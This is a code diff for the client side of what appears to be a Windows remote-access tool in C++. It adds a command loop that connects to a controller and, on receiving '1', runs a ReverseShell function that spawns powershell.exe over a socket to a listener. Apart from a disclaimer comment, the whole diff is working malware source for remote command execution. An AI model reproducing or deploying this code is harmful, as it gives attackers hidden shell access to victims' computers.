@@ -1,3 +1,8 @@
+/*
+Author: millybilligan
+GitHub: https://github.com/millybilligan
+The author is not responsible for the use of this program. Use for illegal purposes is prohibited!
+*/
 #include "client.h"
 
 INT Client::versionGet() {
@@ -70,7 +75,7 @@ INT Client::ReverseShell() {
 
 	sock_addr.sin_family = AF_INET;
 	sock_addr.sin_port = htons(3020);
-	sock_addr.sin_addr.s_addr = inet_addr("192.168.1.37");
+	sock_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
 
 	cout << "Connecting to the taget...\n";
 
@@ -79,6 +84,7 @@ INT Client::ReverseShell() {
 			cout << "Connected!\n";
 			break;
 		}
+		
 	}
 
 	memset(&sui, 0, sizeof(sui));
@@ -89,4 +95,35 @@ INT Client::ReverseShell() {
 	WCHAR commandLine[256] = L"powershell.exe";
 	CreateProcessW(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
 	return 0;
+}
+
+void Client::startConnection() {
+	WSAData wsaData;
+	WORD DLLVersion = MAKEWORD(2, 1);
+	WSAStartup(DLLVersion, &wsaData);
+
+	SOCKADDR_IN addr;
+	int sizeofAddr = sizeof(addr);
+	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
+	addr.sin_port = htons(1111);
+	addr.sin_family = AF_INET;
+
+	SOCKET Connection = socket(AF_INET, SOCK_STREAM, 0);
+
+	while (connect(Connection, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
+		cout << ".";
+	} cout << "\nSuccess!\n";
+
+	while (true) {
+		char buf = NULL;
+		recv(Connection, &buf, sizeof(buf), 0);
+		cout << buf;
+		if (buf == '1') 
+			ReverseShell();
+
+		if (buf == '?') {
+			buf = '!';
+			send(Connection, &buf, sizeof(buf), 0);
+		}
+	}
 }
